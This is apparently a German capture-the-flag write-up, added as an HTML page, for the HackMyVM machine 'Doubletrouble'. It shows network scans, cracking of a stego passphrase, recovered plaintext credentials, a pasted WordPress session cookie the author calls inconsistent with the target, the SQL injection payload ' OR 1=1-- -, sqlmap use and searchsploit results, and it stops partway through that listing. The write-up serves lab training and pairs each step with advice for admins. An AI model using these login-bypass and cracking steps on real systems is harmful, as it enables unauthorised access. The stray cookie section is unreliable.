@@ -1,0 +1,760 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Doubletrouble - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Sicherstellen, dass style.css die korrekte Header-Farbe (#03b5f5) und die roten Farben für .difficulty-Hard enthält -->
+</head>
+ <body>
+ 
+
+    <!-- Hinweis: Die CSS-Datei muss die Hintergrundfarbe #03b5f5 für .header-bg definieren -->
+    <div class="header-bg">
+        <h1>Doubletrouble - HackMyVM - Level: Easy - Bericht</h1> <!-- Name und Level angepasst -->
+        <div class="level-container">
+            <!-- Klassen für rote Farbe (Hard), Text ist aber "Easy" -->
+            <h2 class="difficulty-Hard">Easy</h2>
+            <div class="circle difficulty-bg-Hard">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <!-- Die CSS-Datei muss die passende Hintergrundfarbe für .inner definieren, die mit #03b5f5 korrespondiert -->
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Tools basierend auf dem Berichtstext -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">wget</div>
+                <div class="tool-item">exiftool</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">searchsploit</div>
+                <div class="tool-item">python</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">awk</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis mit POC -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis"><strong>Analyse:</strong> Der erste Schritt ist die Identifizierung von aktiven Hosts im lokalen Netzwerksegment. `arp-scan -l` sendet ARP-Anfragen an alle möglichen Adressen im lokalen Netz, um herauszufinden, welche IP-Adressen mit welchen MAC-Adressen verknüpft sind.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Befehl ist essenziell in lokalen Netzwerktests, um schnell aktive Ziele zu finden, ohne auf langsamere IP-Scans angewiesen zu sein. Die Ausgabe zeigt einen potenziellen Zielhost unter der IP 192.168.2.120 mit einer MAC-Adresse, die auf eine virtuelle Maschine von PCS Systemtechnik GmbH (oft auch bei VirtualBox zu sehen) hinweist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die gefundene IP-Adresse sollte als primäres Ziel für weitere Scans (z.B. Portscans mit Nmap) verwendet werden.<br><strong>Empfehlung (Admin):</strong> Netzwerk-Monitoring implementieren, um ungewöhnliche ARP-Aktivitäten zu erkennen. Sicherstellen, dass nur autorisierte Geräte im Netzwerk aktiv sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.120	08:00:27:9c:83:dc	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Nachdem die Ziel-IP bekannt ist, wird `nmap` verwendet, um offene Ports, laufende Dienste und Betriebssysteminformationen zu sammeln.
+                - `-sS`: Führt einen TCP SYN Scan (Stealth Scan) durch, der oft weniger auffällig ist als ein voller TCP Connect Scan.
+                - `-sC`: Führt Standard-Nmap-Skripte aus, um zusätzliche Informationen über die Dienste zu sammeln (z.B. Banner, Konfigurationen).
+                - `-T5`: Setzt das Timing-Template auf "insane", um den Scan zu beschleunigen. Dies kann auf Kosten der Genauigkeit gehen oder Intrusion Detection Systems (IDS) auslösen.
+                - `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute.
+                - `192.168.2.120`: Die Ziel-IP-Adresse.
+                - `-p-`: Scannt alle 65535 TCP-Ports.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Nmap-Scan ist äußerst aufschlussreich. Er identifiziert zwei offene Ports:
+                - **Port 22 (SSH):** OpenSSH 7.9p1 auf Debian 10. Dies ist ein potenzieller Eingangspunkt, falls gültige Anmeldedaten gefunden oder Schwachstellen in dieser SSH-Version ausgenutzt werden können. Die Hostkeys werden ebenfalls angezeigt.
+                - **Port 80 (HTTP):** Apache 2.4.38 auf Debian. Die Startseite (`/`) hat den Titel "qdPM | Login", was auf das Projektmanagement-Tool qdPM hindeutet. Dies ist ein sehr interessanter Angriffspunkt, da Webanwendungen oft Schwachstellen aufweisen.
+            Die Betriebssystemerkennung deutet auf Linux (Kernel 4.x oder 5.x) hin. Die MAC-Adresse bestätigt, dass es sich um eine Oracle VirtualBox VM handelt. Die Netzwerkdistanz von 1 Hop bestätigt, dass sich das Ziel im selben lokalen Netzwerk befindet.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fokussiere dich auf die Webanwendung (qdPM) auf Port 80. Untersuche sie auf bekannte Schwachstellen (CVEs), Standardanmeldeinformationen, SQL-Injection, XSS, etc. Versuche auch, SSH-Anmeldeinformationen zu finden oder zu bruteforcen (obwohl Bruteforce laut sein kann).<br><strong>Empfehlung (Admin):</strong> Halte alle Dienste (SSH, Apache, qdPM) auf dem neuesten Stand, um bekannte Schwachstellen zu vermeiden. Konfiguriere die Firewall so, dass nur benötigte Ports offen sind. Verwende starke Passwörter für SSH und Webanwendungen. Überwache Login-Versuche.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.120 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-24 22:33 CET
+Nmap scan report for doubletrouble (192.168.2.120)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 6afed61723cb90792bb12d3753974658 (RSA)
+|   256 5bc468d18959d748b096f311871c08ac (ECDSA)
+|_  256 613966881d8ff1d040611e99c51a1ff4 (ED25519)
+80/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-title: qdPM | Login
+|_http-server-header: Apache/2.4.38 (Debian)
+MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms doubletrouble (192.168.2.120)
+                    </pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+            <p class="analysis"><strong>Analyse:</strong> Basierend auf der Entdeckung von Verzeichnissen im späteren Gobuster-Scan (speziell `/secret/`), wird versucht, eine Datei namens `doubletrouble.jpg` aus diesem Verzeichnis herunterzuladen. `wget` ist ein Kommandozeilen-Tool zum Herunterladen von Dateien aus dem Web.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Download war erfolgreich (HTTP-Status 200 OK). Eine 81KB große JPEG-Datei wurde gespeichert. Bilder können Metadaten oder versteckte Informationen (Steganographie) enthalten, die für den weiteren Test relevant sein könnten.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die heruntergeladene Bilddatei mit Tools wie `exiftool` auf Metadaten und mit Steganographie-Tools wie `steghide` oder `stegseek`, um versteckte Daten zu finden.<br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass keine sensiblen Informationen versehentlich in öffentlich zugänglichen Dateien (einschließlich Bildern) gespeichert werden. Überprüfe regelmäßig Webserver-Verzeichnisse auf unerwartete oder versteckte Inhalte.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget http://192.168.2.120/secret/doubletrouble.jpg</span></div>
+                    <pre>
+--2022-11-24 22:34:38--  http://192.168.2.120/secret/doubletrouble.jpg
+Verbindungsaufbau zu 192.168.2.120:80 … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … 200 OK
+Länge: 82779 (81K) [image/jpeg]
+Wird in »doubletrouble.jpg« gespeichert.
+
+doubletrouble.jpg             100%[=====================================================>]  80,84K  --.-KB/s    in 0,002s
+
+2022-11-24 22:34:38 (36,9 MB/s) - »doubletrouble.jpg« gespeichert [82779/82779]
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um die Metadaten (EXIF-Daten) der heruntergeladenen JPEG-Datei zu analysieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Ausgabe zeigt Standard-Bildmetadaten wie Größe, Dateityp, Dimensionen und Erstellungs-/Modifikationszeiten. Es sind keine offensichtlich verdächtigen oder direkt nützlichen Informationen (wie Kommentare, GPS-Koordinaten oder versteckte Hinweise) in den Metadaten sichtbar. Dies schließt jedoch nicht aus, dass Daten mittels Steganographie im Bild selbst versteckt sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Da Exiftool keine Hinweise liefert, sind als nächstes Steganographie-Tools wie `stegseek` oder `steghide` zu verwenden.<br><strong>Empfehlung (Admin):</strong> Entferne unnötige Metadaten aus öffentlich zugänglichen Bildern, um Informationslecks zu minimieren (obwohl in diesem Fall keine sensiblen Daten gefunden wurden).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">exiftool doubletrouble.jpg</span></div>
+                    <pre>
+ExifTool Version Number         : 12.49
+File Name                       : doubletrouble.jpg
+Directory                       : .
+File Size                       : 83 kB
+File Modification Date/Time     : 2021:09:11 17:39:57+02:00
+File Access Date/Time           : 2022:11:24 22:34:38+01:00
+File Inode Change Date/Time     : 2022:11:24 22:34:38+01:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Image Width                     : 501
+Image Height                    : 450
+Encoding Process                : Baseline DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 501x450
+Megapixels                      : 0.225
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `stegseek` ist ein schnelles Steganographie-Tool, das versucht, versteckte Daten in einer Datei zu finden, indem es Passwörter aus einer Wortliste (hier `rockyou.txt`) ausprobiert. Es wird auf die Datei `doubletrouble.jpg` angewendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Volltreffer! `stegseek` hat erfolgreich ein Passwort (`<span class="password">92camaro</span>`) gefunden, mit dem versteckte Daten extrahiert werden konnten. Die extrahierten Daten wurden in der Datei `doubletrouble.jpg.out` gespeichert, und der ursprüngliche Dateiname der versteckten Datei war `creds.txt`. Der Dateiname "creds.txt" deutet stark auf Anmeldeinformationen hin.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche sofort den Inhalt der extrahierten Datei `doubletrouble.jpg.out` (`cat doubletrouble.jpg.out`), um die gefundenen Anmeldeinformationen zu sehen.<br><strong>Empfehlung (Admin):</strong> Vermeide es, sensible Daten wie Anmeldeinformationen mittels Steganographie in öffentlich zugänglichen Dateien zu verstecken. Dies ist keine sichere Methode zur Aufbewahrung von Geheimnissen. Schulen Sie Mitarbeiter darin, sichere Methoden zur Speicherung und Übertragung von Zugangsdaten zu verwenden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Found passphrase: "<span class="password">92camaro</span>"
+[i] Original filename: "creds.txt".
+[i] Extracting to "doubletrouble.jpg.out".
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `cat` wird verwendet, um den Inhalt der von `stegseek` extrahierten Datei `doubletrouble.jpg.out` anzuzeigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält tatsächlich Anmeldeinformationen: einen Benutzernamen (`otisrush@localhost.com`) und ein Passwort (`<span class="password">otis666</span>`). Diese könnten für den SSH-Zugang (Port 22) oder die Webanwendung qdPM (Port 80) gültig sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche, dich mit diesen Zugangsdaten sowohl über SSH als auch bei der qdPM-Webanwendung anzumelden.<br><strong>Empfehlung (Admin):</strong> Ändere sofort das Passwort für den Benutzer `otisrush`, falls dieser Account existiert und dieses Passwort verwendet. Überprüfe, wo diese Zugangsdaten möglicherweise noch verwendet werden. Stelle sicher, dass Passwort-Richtlinien durchgesetzt werden und keine schwachen oder kompromittierten Passwörter im Umlauf sind.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat doubletrouble.jpg.out</span></div>
+                    <pre>
+otisrush@localhost.com
+<span class="password">otis666</span>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Es wird versucht, sich mit den gefundenen Zugangsdaten (`otisrush` und dem Passwort `<span class="password">otis666</span>`) über SSH am Zielsystem anzumelden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login schlägt fehl ("Permission denied"). Das Passwort `<span class="password">otis666</span>` ist für den SSH-Zugang des Benutzers `otisrush` nicht korrekt oder der Benutzer darf sich nicht per SSH anmelden. Die Zugangsdaten könnten jedoch für die Webanwendung (qdPM) gültig sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuche die Anmeldedaten (`otisrush@localhost.com` und `<span class="password">otis666</span>`) im Login-Formular der qdPM-Webanwendung auf Port 80.<br><strong>Empfehlung (Admin):</strong> Überwache fehlgeschlagene SSH-Login-Versuche (z.B. mit fail2ban), um Brute-Force-Angriffe zu erkennen und zu blockieren. Stelle sicher, dass SSH-Zugang nur für berechtigte Benutzer erlaubt ist.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh otisrush@192.168.2.120</span></div>
+                    <pre>
+otisrush@192.168.2.120's password:
+Permission denied, please try again.
+otisrush@192.168.2.120's password:
+Permission denied, please try again.
+otisrush@192.168.2.120's password:
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `gobuster` wird eingesetzt, um Verzeichnisse und Dateien auf dem Webserver zu finden (Directory/File Brute-Forcing).
+                - `dir`: Gibt den Modus für die Verzeichnissuche an.
+                - `-u http://192.168.2.120`: Die Ziel-URL.
+                - `-x ...`: Eine lange Liste von Dateierweiterungen, nach denen zusätzlich gesucht werden soll (z.B. `.php`, `.txt`, `.zip`).
+                - `-w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"`: Die Wortliste, die für die Suche verwendet wird.
+                - `-b '403,404'`: Statuscodes, die ignoriert werden sollen (Forbidden, Not Found).
+                - `-e`: Expanded Mode, zeigt die vollständige URL an.
+                - `-t 100`: Verwendet 100 Threads für eine schnellere Suche.
+                - `-n`: Verhindert die Ausgabe des Statuscodes (nur gefundene URLs).
+                - `-k`: Überspringt die SSL-Zertifikatsprüfung (hier nicht relevant, da HTTP).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gobuster hat mehrere interessante Verzeichnisse und Dateien gefunden:
+                - `/index.php`: Die Hauptseite (wahrscheinlich das qdPM-Login).
+                - `/uploads/`, `/images/`, `/css/`, `/template/`, `/core/`, `/install/`, `/js/`, `/sf/`: Typische Verzeichnisse von Webanwendungen. `/uploads` und `/install` könnten besonders interessant sein.
+                - `/check.php`: Eine leere PHP-Datei.
+                - `/favicon.png`: Das Favicon der Seite.
+                - `/readme.txt`: Könnte Versionsinformationen oder andere Hinweise enthalten.
+                - `/robots.txt`: Enthält oft Anweisungen für Webcrawler, manchmal auch versteckte Pfade.
+                - `/secret/`: Das Verzeichnis, aus dem zuvor `doubletrouble.jpg` heruntergeladen wurde. Das Vorhandensein dieses Verzeichnisses ist bestätigt.
+                - `/backups/`: Potenziell sehr interessant, könnte alte Codeversionen oder Datenbank-Backups enthalten.
+                - `/batch/`: Unklar, könnte für Stapelverarbeitungs-Skripte sein.
+            Diese Funde erweitern die Angriffsfläche erheblich.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuche die gefundenen Verzeichnisse und Dateien manuell im Browser, insbesondere `/uploads`, `/install`, `/readme.txt`, `/robots.txt`, `/secret`, `/backups`. Achte auf interessante Dateien, Konfigurationsfehler oder weitere Informationslecks.<br><strong>Empfehlung (Admin):</strong> Entferne oder schütze nicht benötigte Verzeichnisse und Dateien (z.B. `/install` nach der Installation, `/backups`, `/secret`). Konfiguriere den Webserver so, dass Directory Listing deaktiviert ist. Überprüfe die Berechtigungen für das `/uploads`-Verzeichnis sorgfältig.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.120 -x txt,php,rar,zip,tar,pub,xls,docx,doc,sql,db,mdb,asp,aspx,accdb,bat,ps1,exe,sh,py,pl,gz,jpeg,jpg,png,html,phtml,xml,csv,dll,pdf,raw,rtf,xlsx,zip,kdbx -w "/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"  -b '403,404' -e -t 100 -n -k</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.3
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.120
+[+] Method:                  GET
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   403,404
+[+] User Agent:              gobuster/3.3
+[+] Extensions:              asp,csv,jpeg,png,txt,ps1,html,tar,docx,db,mdb,sh,xls,sql,py,xlsx,php,exe,pdf,raw,kdbx,doc,bat,pl,gz,jpg,rtf,xml,dll,rar,zip,pub,aspx,accdb,phtml
+[+] Expanded:                true
+[+] No status:               true
+[+] Timeout:                 10s
+===============================================================
+2022/11/24 22:33:29 Starting gobuster in directory enumeration mode
+===============================================================
+http://192.168.2.120/index.php            [Size: 5812]
+http://192.168.2.120/uploads              [Size: 316] [--> http://192.168.2.120/uploads/]
+http://192.168.2.120/images               [Size: 315] [--> http://192.168.2.120/images/]
+http://192.168.2.120/css                  [Size: 312] [--> http://192.168.2.120/css/]
+http://192.168.2.120/template             [Size: 317] [--> http://192.168.2.120/template/]
+http://192.168.2.120/core                 [Size: 313] [--> http://192.168.2.120/core/]
+http://192.168.2.120/install              [Size: 316] [--> http://192.168.2.120/install/]
+http://192.168.2.120/js                   [Size: 311] [--> http://192.168.2.120/js/]
+http://192.168.2.120/check.php            [Size: 0]
+http://192.168.2.120/sf                   [Size: 311] [--> http://192.168.2.120/sf/]
+http://192.168.2.120/favicon.png          [Size: 2183]
+http://192.168.2.120/readme.txt           [Size: 470]
+http://192.168.2.120/robots.txt           [Size: 26]
+http://192.168.2.120/secret               [Size: 315] [--> http://192.168.2.120/secret/]
+http://192.168.2.120/backups              [Size: 316] [--> http://192.168.2.120/backups/]
+http://192.168.2.120/batch                [Size: 314] [--> http://192.168.2.120/batch/]
+===============================================================
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Diese Zeilen scheinen manuell extrahierte oder notierte Informationen zu sein, möglicherweise aus der Analyse der gefundenen Dateien (`robots.txt`), dem Abfangen von HTTP-Verkehr (Cookies) oder manuellen SQL-Injection-Tests.</p>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                - Die `User-agent:` und `Disallow:` Zeilen stammen wahrscheinlich aus `robots.txt`, geben aber hier keine nützlichen Pfade preis.
+                - Die Cookie-Zeile zeigt WordPress-bezogene Cookies (`wp-settings`, `wordpress_test_cookie`, `wordpress_logged_in`). Dies ist **widersprüchlich** zur vorherigen Entdeckung von qdPM. Entweder laufen beide Anwendungen, oder diese Cookies stammen von einem anderen Test/einer anderen Seite. Sie deuten auf einen angemeldeten Benutzer `gill` hin. Dies ist ein wichtiger Hinweis, der weiterverfolgt werden sollte, auch wenn er nicht zu qdPM passt.
+                - `' OR 1=1-- -`: Dies ist ein klassischer SQL-Injection-Payload, der oft verwendet wird, um Logins zu umgehen oder Daten abzufragen. Es deutet darauf hin, dass SQL-Injection-Versuche unternommen wurden oder werden sollen.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kläre den Widerspruch zwischen qdPM und WordPress. Gibt es eine versteckte WordPress-Instanz? Untersuche die WordPress-Cookies weiter. Teste die qdPM-Anwendung systematisch auf SQL-Injection, insbesondere in Login-Formularen oder Suchfeldern, unter Verwendung des `' OR 1=1-- -'` Payloads und anderer Varianten (ggf. mit `sqlmap`).<br><strong>Empfehlung (Admin):</strong> Überprüfe die Webserver-Konfiguration auf das Vorhandensein sowohl von qdPM als auch von WordPress. Wenn WordPress nicht benötigt wird, deaktiviere oder entferne es. Implementiere Web Application Firewalls (WAF) und sichere Programmierpraktiken (Prepared Statements), um SQL-Injection zu verhindern. Sichere Cookie-Einstellungen (HttpOnly, Secure Flags).</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+#User-agent:
+#Disallow:
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                   <pre>
+Cookie wp-settings-time-2=1669130534; wp-settings-2=mfold%3Do;
+       wordpress_test_cookie=WP+Cookie+check;
+       wordpress_logged_in_9c0c1f4b0e96b4ec3eec0a9f4828e283=
+       gill%7C1669303294%7CACo3GsE5aRdHGzFMVdaq2cJona6iVhMAd
+       jQyqLMaWOi%7C91d6ab936ec4a8d7d8250182eb7770b5a29efa677
+       b11b8c1ff260de21d3e5d21
+                    </pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                   <pre>
+' OR 1=1-- -
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `steghide` ist ein weiteres Steganographie-Tool. Hier wird versucht, Daten aus `doubletrouble.jpg` zu extrahieren. Da `stegseek` bereits erfolgreich war und das Passwort (`<span class="password">92camaro</span>`) bekannt ist, wird dieses hier vermutlich eingegeben.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `steghide` bestätigt das Ergebnis von `stegseek`. Es extrahiert ebenfalls die Daten und speichert sie in `creds.txt`. Dies zeigt, dass die Daten mit `steghide` eingebettet wurden oder zumindest mit beiden Tools extrahierbar sind.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies bestätigt die vorherigen Funde. Keine neuen Aktionen erforderlich, außer die gewonnenen Zugangsdaten weiter zu verwenden.<br><strong>Empfehlung (Admin):</strong> Siehe Empfehlungen zu `stegseek`. Verhindern Sie das Einbetten von sensiblen Daten in öffentlich zugängliche Dateien.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf doubletrouble.jpg</span></div>
+                    <pre>
+Passwort eingeben:
+Extrahierte Daten wurden nach "creds.txt" geschrieben.
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `ls` listet den Inhalt des aktuellen Verzeichnisses, hier speziell die Datei `creds.txt`, um deren Existenz zu bestätigen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei `creds.txt` existiert wie erwartet nach der Extraktion mit `steghide`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine weitere Aktion nötig, dient nur der Bestätigung.<br><strong>Empfehlung (Admin):</strong> Keine spezifische Empfehlung für diesen Befehl.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ls  creds.txt</span></div>
+                    <pre>
+creds.txt
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Erneutes Anzeigen des Inhalts der Datei `creds.txt` mit `cat`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut die Zugangsdaten: `otisrush@localhost.com` und `<span class="password">otis666</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Siehe vorherige Empfehlung bei `cat doubletrouble.jpg.out`.<br><strong>Empfehlung (Admin):</strong> Siehe vorherige Empfehlung bei `cat doubletrouble.jpg.out`.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">cat creds.txt</span></div>
+                    <pre>
+otisrush@localhost.com
+<span class="password">otis666</span>
+                    </pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `sqlmap` ist ein automatisiertes Tool zur Erkennung und Ausnutzung von SQL-Injection-Schwachstellen. Hier wird es auf die Hauptseite der qdPM-Anwendung angesetzt (`index.php?id=1`), was auf einen GET-Parameter `id` hindeutet, der möglicherweise anfällig ist.
+                - `-u http://192.168.2.120/index.php?id=1`: Die zu testende URL.
+                - `--batch`: Führt `sqlmap` im nicht-interaktiven Modus aus und beantwortet Fragen mit Standardwerten.
+                - `--dbs`: Versucht, die Namen aller verfügbaren Datenbanken aufzulisten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Im bereitgestellten Text fehlt die Ausgabe von `sqlmap`. Es ist unklar, ob der Befehl erfolgreich war und Datenbanken gefunden hat oder ob er abgebrochen wurde/fehlschlug. Ohne Ausgabe kann keine Bewertung des Ergebnisses erfolgen. Die Tatsache, dass der Befehl ausgeführt wurde, zeigt jedoch, dass eine SQL-Injection vermutet wurde.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führe den `sqlmap`-Befehl erneut aus und analysiere die Ausgabe sorgfältig. Wenn `--batch` Probleme verursacht, lasse es weg und beantworte die Fragen interaktiv. Wenn `sqlmap` Schwachstellen findet, versuche, Daten auszulesen (Tabellen, Spalten, Inhalte) oder sogar eine Shell über SQL-Injection zu erhalten.<br><strong>Empfehlung (Admin):</strong> Überprüfe den Quellcode der Anwendung (speziell `index.php`) auf sichere Handhabung des `id`-Parameters. Verwende Prepared Statements oder eine adäquate Eingabevalidierung und -sanitisierung, um SQL-Injection zu verhindern. Analysiere Webserver-Logs auf verdächtige `sqlmap`-Anfragen.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">sqlmap -u http://192.168.2.120/index.php?id=1 --batch --dbs</span></div>
+                    <!-- Keine Ausgabe im Originaltext vorhanden -->
+                    <pre></pre>
+                </div>
+            </div>
+
+            <p class="analysis"><strong>Analyse:</strong> `searchsploit` ist ein Kommandozeilen-Tool, um die Exploit-DB-Datenbank nach bekannten Exploits für bestimmte Software zu durchsuchen. Hier wird nach Exploits für "qdPM 9.1" gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `searchsploit` listet mehrere bekannte Schwachstellen und zugehörige Exploits für qdPM 9.1 auf, darunter:
+                - Cross-Site Scripting (XSS)
+                - SQL Injection (SQLi)
+                - Arbitrary File Upload
+                - **Remote Code Execution (RCE)** (mehrere Varianten, teils authentifiziert)
+            Das Vorhandensein mehrerer RCE-Exploits ist besonders kritisch und bietet einen vielversprechenden Weg für den Initial Access.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentriere dich auf die RCE-Exploits (z.B. `47954.py`, `50175.py`, `50944.py`, `48146.py`). Untersuche die Exploit-Skripte, um ihre Funktionsweise und Voraussetzungen zu verstehen. Lade einen passenden Exploit herunter und versuche, ihn gegen das Zielsystem auszuführen.<br><strong>Empfehlung (Admin):</strong> Update qdPM **dringend** auf eine Version, die diese Schwachstellen behebt, oder ersetze die Software, falls keine Patches verfügbar sind. Bis dahin sollte der Zugriff auf die Anwendung stark eingeschränkt oder sie offline genommen werden.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">searchsploit qdPM 9.1</span></div>
+                    <pre>
+------------------------------------------------------------------------------------ ---------------------------------
+ Exploit Title                                                                      |  Path
+------------------------------------------------------------------------------------ ---------------------------------
+qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                      | php/webapps/48486.txt
+qdPM 9.1 - 'filter_by' SQL Injection                                                | php/webapps/45767.txt
